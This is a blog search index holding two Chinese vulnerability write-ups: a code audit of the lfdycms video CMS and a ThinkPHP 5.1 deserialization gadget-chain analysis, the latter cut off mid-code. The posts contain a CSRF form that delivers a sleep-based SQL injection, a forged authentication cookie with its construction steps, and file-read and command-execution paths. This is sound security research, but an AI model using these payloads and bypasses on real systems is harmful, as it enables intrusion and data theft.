<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>lfdycms审计</title>
    <link href="/2021/04/16/23859/"/>
    <url>/2021/04/16/23859/</url>
    
    <content type="html"><![CDATA[<p>前段时间审计的一个CMS，分享一下</p><a id="more"></a><h1 id="lfdycms简介"><a href="#lfdycms简介" class="headerlink" title="lfdycms简介"></a>lfdycms简介</h1><p>lfdycms是基于thinkphp3.2开发的影视CMS</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h2><p>thinkphp 3.2的find、select、delete存在SQL注入漏洞</p><p>原理：<a href="https://xz.aliyun.com/t/2629#toc-1">https://xz.aliyun.com/t/2629#toc-1</a></p><h3 id="搜索电影注入"><a href="#搜索电影注入" class="headerlink" title="搜索电影注入"></a>搜索电影注入</h3><p>这里使用了存在漏洞的detail方法</p><p>Application/Home/Controller/MovieController.class.php</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;    $id=I(<span class="hljs-string">&#x27;id&#x27;</span>);    $info=D(<span class="hljs-string">&quot;Movie&quot;</span>)-&gt;detail($id);    <span class="hljs-keyword">if</span>(!$info)&#123;    $error = D(<span class="hljs-string">&quot;Movie&quot;</span>)-&gt;getError();    <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-keyword">empty</span>($error) ? <span class="hljs-string">&#x27;未找到该影片！&#x27;</span> : $error,U(<span class="hljs-string">&#x27;Home/Index/index&#x27;</span>));    &#125;    $info=D(<span class="hljs-string">&quot;Tag&quot;</span>)-&gt;movieChange($info,<span class="hljs-string">&quot;movie&quot;</span>,<span class="hljs-number">1</span>);    $tpl=D(<span class="hljs-string">&quot;Category&quot;</span>)-&gt;getTpl($info[<span class="hljs-string">&#x27;cid&#x27;</span>],<span class="hljs-string">&#x27;template_detail&#x27;</span>);    <span class="hljs-keyword">if</span>(!$tpl)&#123;    $error = D(<span class="hljs-string">&quot;Category&quot;</span>)-&gt;getError();    <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-keyword">empty</span>($error) ? <span class="hljs-string">&#x27;未知错误！&#x27;</span> : $error);    &#125;    Cookie(<span class="hljs-string">&#x27;__forward__&#x27;</span>,$_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);    D(<span class="hljs-string">&#x27;Movie&#x27;</span>)-&gt;hits($id);    <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&#x27;pos&#x27;</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">$this</span>-&gt;assign($info);    <span class="hljs-keyword">$this</span>-&gt;display(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;tplpath.<span class="hljs-string">&quot;/&quot;</span>.$tpl);&#125;</code></pre><p>Application/Home/Model/MovieModel.class.php</p><pre><code class="hljs php"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 获取详情页数据</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>  integer $id 文档ID</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> array       详细数据</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detail</span>(<span class="hljs-params">$id</span>)</span>&#123;$info = <span class="hljs-keyword">$this</span>-&gt;field(<span class="hljs-literal">true</span>)-&gt;find($id);<span class="hljs-keyword">if</span>(!(is_array($info) || <span class="hljs-number">1</span> !== $info[<span class="hljs-string">&#x27;status&#x27;</span>] || <span class="hljs-number">1</span> !== $info[<span class="hljs-string">&#x27;display&#x27;</span>]))&#123;<span class="hljs-keyword">$this</span>-&gt;error = <span class="hljs-string">&#x27;影片被禁用或已删除！&#x27;</span>;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">return</span> $info;&#125;</code></pre><p>搜索存在漏洞的detail方法，可以看到home模块下有四个可利用的点，查了下CNVD，都被人报上去了，还看到一个Ajaxcontroller.class.php控制器拼接参数的注入</p><p><img src="/img/photo/search.png" alt="搜索结果"></p><p>其他几个也是这样，就不写了</p><h3 id="随机返回电影注入"><a href="#随机返回电影注入" class="headerlink" title="随机返回电影注入"></a>随机返回电影注入</h3><p>还有拼接参数的</p><p>Application/Home/Controller/AjaxController.class.php</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randMovie</span>(<span class="hljs-params"></span>)</span>&#123;    $data=D(<span class="hljs-string">&#x27;Ajax&#x27;</span>)-&gt;randMovie(I(<span class="hljs-string">&#x27;limit&#x27;</span>),I(<span class="hljs-string">&#x27;category&#x27;</span>));    <span class="hljs-keyword">$this</span>-&gt;ajaxReturn($data);&#125;</code></pre><p>Application/Home/Model/AjaxModel.class.php</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randMovie</span>(<span class="hljs-params">$limit=<span class="hljs-number">6</span>,$category=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<span class="hljs-keyword">if</span>($category)&#123;$type=<span class="hljs-string">&#x27;and category=&#x27;</span>.$category;&#125;$prefix=C(<span class="hljs-string">&#x27;DB_PREFIX&#x27;</span>);$mlist=M()-&gt;query(<span class="hljs-string">&#x27;SELECT * FROM `&#x27;</span>.$prefix.<span class="hljs-string">&#x27;movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `&#x27;</span>.$prefix.<span class="hljs-string">&#x27;movie`)-(SELECT MIN(id) FROM `&#x27;</span>.$prefix.<span class="hljs-string">&#x27;movie`))+(SELECT MIN(id) FROM `&#x27;</span>.$prefix.<span class="hljs-string">&#x27;movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx &#x27;</span>.$type.<span class="hljs-string">&#x27; ORDER BY t1.id LIMIT &#x27;</span>.$limit);<span class="hljs-keyword">foreach</span>($mlist <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;$list[$key]=D(<span class="hljs-string">&#x27;Tag&#x27;</span>)-&gt;movieChange($value,<span class="hljs-string">&#x27;movie&#x27;</span>);&#125;<span class="hljs-keyword">return</span> $list;&#125;</code></pre><h3 id="普通用户发送信息注入"><a href="#普通用户发送信息注入" class="headerlink" title="普通用户发送信息注入"></a>普通用户发送信息注入</h3><p>必须用GET，这里可以看成前台，因为普通用户可以认证绕过</p><p>Application/User/Controller/MessageController.class.php的add方法调用存在漏洞的get_user_name方法</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">if</span>(IS_POST)&#123;        $rs = D(<span class="hljs-string">&#x27;Message&#x27;</span>)-&gt;send();        <span class="hljs-keyword">if</span>($rs)&#123;            <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;信息发送成功！&#x27;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;error(D(<span class="hljs-string">&#x27;Message&#x27;</span>)-&gt;getError());        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;uid&#x27;</span>])&#123;<span class="hljs-keyword">$this</span>-&gt;username=get_user_name(I(<span class="hljs-string">&#x27;get.uid&#x27;</span>));<span class="hljs-keyword">$this</span>-&gt;type=<span class="hljs-number">1</span>;&#125;        <span class="hljs-keyword">$this</span>-&gt;display();    &#125;&#125;</code></pre><p>Application/Common/Common/function.php的get_user_name方法，这里使用find方法导致产生SQL注入漏洞</p><pre><code class="hljs php"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 根据用户ID获取用户昵称</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>  integer $uid 用户ID</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> string       用户昵称</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_user_name</span>(<span class="hljs-params">$uid = <span class="hljs-number">0</span></span>)</span>&#123;$info = M(<span class="hljs-string">&#x27;Users&#x27;</span>)-&gt;field(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;find($uid);<span class="hljs-keyword">if</span>($info !== <span class="hljs-literal">false</span> &amp;&amp; $info[<span class="hljs-string">&#x27;username&#x27;</span>] )&#123;$name = $info[<span class="hljs-string">&#x27;username&#x27;</span>];&#125; <span class="hljs-keyword">else</span> &#123;$name = <span class="hljs-string">&#x27;&#x27;</span>;&#125;    <span class="hljs-keyword">return</span> $name;&#125;</code></pre><h2 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h2><h3 id="发送信息注入"><a href="#发送信息注入" class="headerlink" title="发送信息注入"></a>发送信息注入</h3><p>管理员后台发送信息位置存在SQL注入，和普通用户原理是一样的</p><h3 id="后台删除影片注入"><a href="#后台删除影片注入" class="headerlink" title="后台删除影片注入"></a>后台删除影片注入</h3><p>Application/Admin/Controller/MovieController.class.php</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delurl</span>(<span class="hljs-params">$pid = <span class="hljs-literal">null</span></span>)</span>&#123;       <span class="hljs-comment">//删除影片地址</span>       $res = M(<span class="hljs-string">&#x27;movie_url&#x27;</span>)-&gt;delete($pid);       <span class="hljs-keyword">if</span>($res !== <span class="hljs-literal">false</span>)&#123;           <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;删除影片播放地址成功！&#x27;</span>);       &#125;<span class="hljs-keyword">else</span>&#123;           <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;删除影片播放地址失败！&#x27;</span>);       &#125;&#125;</code></pre><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>thinkphp有验证令牌的方法autoCheckToken()可以用于防止CSRF，位于ThinkPHP/Library/Think/Model.class.php，管理员后台的用户添加功能就调用了这个方法，因此无法通过CSRF添加用户（不过能添加也不行，这操作太明显了）</p><p>发送消息功能并没有CSRF防护，测试SQL注入的POC</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://lfdycms.tlmssfs.com/admin.php&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">formname</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;s&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#47;</span>Message<span class="hljs-symbol">&amp;#47;</span>add<span class="hljs-symbol">&amp;#46;</span>html&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id<span class="hljs-symbol">&amp;#91;</span>alias<span class="hljs-symbol">&amp;#93;</span>&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;where<span class="hljs-symbol">&amp;#32;</span>1<span class="hljs-symbol">&amp;#32;</span>and<span class="hljs-symbol">&amp;#32;</span>sleep<span class="hljs-symbol">&amp;#40;</span>5<span class="hljs-symbol">&amp;#41;</span><span class="hljs-symbol">&amp;#45;</span><span class="hljs-symbol">&amp;#45;</span>&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.formname.submit()</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><h2 id="用户遍历"><a href="#用户遍历" class="headerlink" title="用户遍历"></a>用户遍历</h2><p><a href="http://lfdycms.tlmssfs.com/admin.php?s=/Public/login.html">http://lfdycms.tlmssfs.com/admin.php?s=/Public/login.html</a></p><p>管理员登录报错信息会提示用户不存在，如果能识别验证码就能遍历用户，实在不行手测也是可以的</p><p>Application/Admin/Controller/PublicController.class.php</p><pre><code class="hljs php"><span class="hljs-comment">/**</span><span class="hljs-comment">    * 后台用户登录</span><span class="hljs-comment">    */</span>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">$username = <span class="hljs-literal">null</span>, $password = <span class="hljs-literal">null</span>, $passcode = <span class="hljs-literal">null</span></span>)</span>&#123;       <span class="hljs-keyword">if</span>(IS_POST)&#123;           <span class="hljs-comment">/* 检测验证码 <span class="hljs-doctag">TODO:</span> */</span>          <span class="hljs-keyword">if</span>(!check_verify($passcode))&#123;              <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;验证码错误！&quot;</span>);           &#125;           $uid = D(<span class="hljs-string">&#x27;Public&#x27;</span>)-&gt;login($username, $password);           <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> &lt; $uid)&#123; <span class="hljs-comment">//UC登录成功</span>               <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;登录成功！&#x27;</span>, U(<span class="hljs-string">&#x27;Index/index&#x27;</span>));           &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//登录失败</span>               <span class="hljs-keyword">switch</span>($uid) &#123;                   <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>: $error = <span class="hljs-string">&#x27;用户不存在或被禁用！&#x27;</span>; <span class="hljs-keyword">break</span>; <span class="hljs-comment">//系统级别禁用</span>                   <span class="hljs-keyword">case</span> <span class="hljs-number">-2</span>: $error = <span class="hljs-string">&#x27;密码错误！&#x27;</span>; <span class="hljs-keyword">break</span>;                   <span class="hljs-keyword">default</span>: $error = <span class="hljs-string">&#x27;未知错误！&#x27;</span>; <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 0-接口参数错误（调试阶段使用）</span>               &#125;               <span class="hljs-keyword">$this</span>-&gt;error($error);           &#125;       &#125; <span class="hljs-keyword">else</span> &#123;           <span class="hljs-keyword">if</span>(is_login())&#123;               <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-string">&#x27;Index/index&#x27;</span>);           &#125;<span class="hljs-keyword">else</span>&#123;               <span class="hljs-comment">/* 读取数据库中的配置 */</span>$config =   S(<span class="hljs-string">&#x27;DB_CONFIG_DATA&#x27;</span>);<span class="hljs-keyword">if</span>(!$config)&#123;$config =  config_lists();S(<span class="hljs-string">&#x27;DB_CONFIG_DATA&#x27;</span>,$config);&#125;C($config); <span class="hljs-comment">//添加配置</span>                              <span class="hljs-keyword">$this</span>-&gt;display();           &#125;       &#125;   &#125;</code></pre><h2 id="普通用户认证绕过"><a href="#普通用户认证绕过" class="headerlink" title="普通用户认证绕过"></a>普通用户认证绕过</h2><p>认证绕过和审计过的另一个CMS代码基本一样，这还是陈年老认证代码啊。。。</p><p>构造cookie就可以登录</p><pre><code class="hljs python">lf_users_user_auth_sign=<span class="hljs-number">65</span>ec3b63342f804c7b2b97fbf88cda5550544cd7lf_users_user_auth=think%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">22</span>uid%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">2215</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>wdnmd%<span class="hljs-number">22</span>%<span class="hljs-number">7</span>D</code></pre><p>构造过程如下</p><ol><li><p>lf_users_user_auth构造如下格式字符，里面的值只要uid的值存在就可以查到对应用户的其它信息，uid从15开始</p><p><strong>think:{“uid”:”15”,”username”:”2222”}</strong></p></li><li><p>把lf_users_user_auth用http_build_query函数格式化为形如<code>uid=15&amp;username=2222</code>的字符串</p></li><li><p>对第二步构造的字符串用sha1生成摘要，作为签名 lf_users_user_auth_sign</p></li></ol><p>Application/Common/Common/function.php</p><pre><code class="hljs php"><span class="hljs-comment">/**</span><span class="hljs-comment"> *检测用户是否登录</span><span class="hljs-comment">*<span class="hljs-doctag">@returninteger</span> 0-未登录，大于0-当前登录用户ID</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_user_login</span>(<span class="hljs-params"></span>)</span>&#123;    $user = cookie(<span class="hljs-string">&#x27;user_auth&#x27;</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($user)) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> cookie(<span class="hljs-string">&#x27;user_auth_sign&#x27;</span>) == data_auth_sign($user) ? $user[<span class="hljs-string">&#x27;uid&#x27;</span>] : <span class="hljs-number">0</span>;    &#125;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 数据签名认证</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>  array  $data 被认证的数据</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> string       签名</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">data_auth_sign</span>(<span class="hljs-params">$data</span>) </span>&#123;    <span class="hljs-comment">//数据类型检测</span>    <span class="hljs-keyword">if</span>(!is_array($data))&#123;        $data = (<span class="hljs-keyword">array</span>)$data;    &#125;    ksort($data); <span class="hljs-comment">//排序</span>    $code = http_build_query($data); <span class="hljs-comment">//url编码并生成query字符串</span>    $sign = sha1($code); <span class="hljs-comment">//生成签名</span>    <span class="hljs-keyword">return</span> $sign;&#125;</code></pre><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>管理后台模板管理处读取任意文件，获取文件路径只是简单的把<code>*</code>换成了<code>/</code>，经测试成功读取数据库配置文件</p><p>Application/Admin/Controller/TemplateController.class.php</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params">$path = <span class="hljs-literal">null</span></span>)</span>&#123;......$path = realpath(C(<span class="hljs-string">&#x27;TPL_PATH&#x27;</span>).str_replace(<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,$_GET[<span class="hljs-string">&#x27;path&#x27;</span>]));$content=Storage::read($path);$type=substr(strrchr($path, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<span class="hljs-keyword">switch</span>($type)&#123; <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;css&quot;</span>:$mode=<span class="hljs-string">&quot;css&quot;</span>;<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-string">&quot;js&quot;</span>:$mode=<span class="hljs-string">&quot;application/javascript&quot;</span>;<span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:$mode=<span class="hljs-string">&quot;application/x-httpd-php&quot;</span>;<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&#x27;title&#x27;</span>, basename($path));<span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;file_path($path));<span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&#x27;mode&#x27;</span>, $mode);    <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&#x27;content&#x27;</span>, $content);    <span class="hljs-keyword">$this</span>-&gt;meta_title = <span class="hljs-string">&#x27;编辑模板&#x27;</span>;    <span class="hljs-keyword">$this</span>-&gt;display();......&#125;</code></pre><p>另外还有一点，这里虽然没法编辑，但是提交编辑请求后抓包可以得到文件绝对路径</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>学到了thinkphp3的一些开发知识，感觉与thinkphp5区别不大，单字母命名的函数不太友好。。</li><li>即使是框架的二次开发，也会存在拼接SQL语句的情况，原因不尽相同，有的是没法拼接，有的是不方便或者开发者偷懒。</li><li>看到CNVD上有人报RCE，我大概看了下，没找到，改日研究</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/2629">https://xz.aliyun.com/t/2629</a></p><p><a href="https://www.kancloud.cn/manual/thinkphp">https://www.kancloud.cn/manual/thinkphp</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5.1.16-5.1.40反序列化漏洞分析</title>
    <link href="/2020/11/09/23849/"/>
    <url>/2020/11/09/23849/</url>
    
    <content type="html"><![CDATA[<p>最近在学代码审计，很好奇PHP反序列化漏洞在实际场景的代码中是怎么产生和利用的，于是学了几天thinkphp5开发，然后开始分析tp5一个反序列化漏洞。走出舒适区真吃力。</p><a id="more"></a><h1 id="thinkphp5-1-16-5-1-40反序列化漏洞分析"><a href="#thinkphp5-1-16-5-1-40反序列化漏洞分析" class="headerlink" title="thinkphp5.1.16-5.1.40反序列化漏洞分析"></a>thinkphp5.1.16-5.1.40反序列化漏洞分析</h1><p>条件：（满足一个条件就可以了）</p><ol><li>需要一个二次开发反序列化的利用点</li><li>存在文件上传、文件名完全可控、使用了文件操作函数，例如： file_exists(‘phar://恶意文件’)</li></ol><p>版本：thinkphp 5.1.16-5.1.40（测试了5.1.15，5.1.16，5.1.37，5.1.39，5.1.40）</p><h1 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h1><p>think\process\pipes\Windows ⇒__destruct⇒removeFiles⇒file_exists⇒__toString</p><p>think\model\concern\Conversion⇒__toString⇒toJson⇒toArray</p><p>thinkphp\library\think\Request⇒__call⇒isAjax⇒parma⇒input⇒filterValue</p><h1 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h1><p>这里分析的版本是5.1.37，这个漏洞的起点是think\process\pipes\Windows类，通过__destruct方法调用removeFiles方法，传入一个对象给方法里面的file_exists()，调用这个对象的__toString方法，think\model\concern\Conversion这个类的__toString方法存在 可控类-&gt;visible(可控变量)，用thinkphp\library\think\Request类的__call方法调用visible方法，thinkphp\library\think\Request里面还存在一个可以当成 call_user_func(任意参数,任意参数) 的input方法，导致命令执行</p><p>另外，Windows类这里还存在一个反序列化任意文件删除漏洞</p><h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><p>起点是think\process\pipes\Windows类的__destruct方法,这个方法调用了removeFiles方法</p><pre><code class="hljs php"><span class="hljs-comment">// thinkphp\library\think\process\pipes\Windows </span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;close();    <span class="hljs-keyword">$this</span>-&gt;removeFiles();&#125;</code></pre><p>removeFiles方法里面使用了file_exists($filename)， $filename变量可控，如果传入一个对象，会调用对象的__toString方法将对象转换成字符串再判断</p><pre><code class="hljs php"><span class="hljs-comment">// thinkphp\library\think\process\pipes\Windows </span><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">removeFiles</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> $filename) &#123;        <span class="hljs-keyword">if</span> (file_exists($filename)) &#123;            @unlink($filename);        &#125;    &#125;    <span class="hljs-keyword">$this</span>-&gt;files = [];&#125;</code></pre><p>查找分析可利用的__toString方法，think\model\concern\Conversion类的__toString方法可用</p><pre><code class="hljs php"><span class="hljs-comment">//thinkphp\library\think\model\concern\Conversion.php</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;toJson();&#125;</code></pre><p>__toString方法调用了toJson方法</p><pre><code class="hljs php"><span class="hljs-comment">//thinkphp\library\think\model\concern\Conversion.php</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toJson</span>(<span class="hljs-params">$options = JSON_UNESCAPED_UNICODE</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> json_encode(<span class="hljs-keyword">$this</span>-&gt;toArray(), $options);&#125;</code></pre><p>toJson方法又调用了toArray</p><p>下面是关键代码</p><pre><code class="hljs php"><span class="hljs-comment">//thinkphp\library\think\model\concern\Conversion.php</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toArray</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    $item       = [];    $hasVisible = <span class="hljs-literal">false</span>;    ...  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;append)) &#123;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;append <span class="hljs-keyword">as</span> $key =&gt; $name) &#123;            <span class="hljs-keyword">if</span> (is_array($name)) &#123;                <span class="hljs-comment">// 追加关联对象属性</span>                $relation = <span class="hljs-keyword">$this</span>-&gt;getRelation($key);                <span class="hljs-keyword">if</span> (!$relation) &#123;                    $relation = <span class="hljs-keyword">$this</span>-&gt;getAttr($key);                    $relation-&gt;visible($name);                &#125;    ...&#125;</code></pre><p>寻找toArray中的完全可控的部分</p><p>找到了可控类和可控变量</p><p>分析Conversion.php的191、192行</p><p>$relation来自thinkphp\library\think\model\concern\Attribute.php的$this-&gt;data[$name]</p><p>$name来自$this-&gt;append</p><p>因此$relation-&gt;visible($name) 变成了：可控类-&gt;visible(可控变量)</p><pre><code class="hljs php">$relation = <span class="hljs-keyword">$this</span>-&gt;getAttr($key);$relation-&gt;visible($name);</code></pre><p>接下来查找可控visible方法，没有的话就查找可控__call($method,$args)方法但是没有visible的类</p><p>然后调用这个类的visible方法，由于没有visible，visible会作为$method参数传递给__call，这里的$name也会传递给__call方法的$args参数，</p><p><strong>这里有一个细节，使用__call代替visible时，visible会作为$method传入__call方法，$name则传入$args</strong></p><p>在thinkphp\library\think\Request中的__call方法比较好用，$method可控，但是由于$args在330行用array_unshift强制将$this对象添加到前面，需要寻找不受这个参数影响的方法</p><ul><li><p>$this-&gt;hook[$method]可控解释</p><p>这里的$method是前面传递过来的visible，$this-&gt;hook可控，因此只需要设置$this-&gt;hook=[“visible”=&gt;”任意方法”]就能使这里的call_user_func_array($this-&gt;hook[$method], $args); 相当于</p><p>call_user_func_array(‘任意方法’, $args);</p></li></ul><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$method, $args</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (array_key_exists($method, <span class="hljs-keyword">$this</span>-&gt;hook)) &#123;        array_unshift($args, <span class="hljs-keyword">$this</span>);<span class="hljs-comment">//$this-&gt;hook是一个数组，可控,设置$this-&gt;hook=[&quot;visible&quot;=&gt;&quot;任意方法&quot;]</span>        <span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;hook[$method], $args);    &#125;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;method not exists:&#x27;</span> . <span class="hljs-built_in">static</span>::class . <span class="hljs-string">&#x27;-&gt;&#x27;</span> . $method);&#125;</code></pre><p>开始寻找不受$this对象影响的方法</p><p>\think\Request中的input方法是一个部分可控的方法，相当于call_user_func($filter,$data)</p><p>但是由于这里$data不可控，且$name = (string) $name;这里如果直接在__call调用input的话，由于__call方法里的$args数组第一个参数是一个固定的$this对象，会传递给input方法的第一个参数$data，$data在getData方法里面是作为数组使用，由于$this对象无法作为数组使用，框架会报错。</p><p>因此需要找一个调用了input方法且能控制$data参数并且可以控制$name的方法</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">input</span>(<span class="hljs-params">$data = [], $name = <span class="hljs-string">&#x27;&#x27;</span>, $default = <span class="hljs-literal">null</span>, 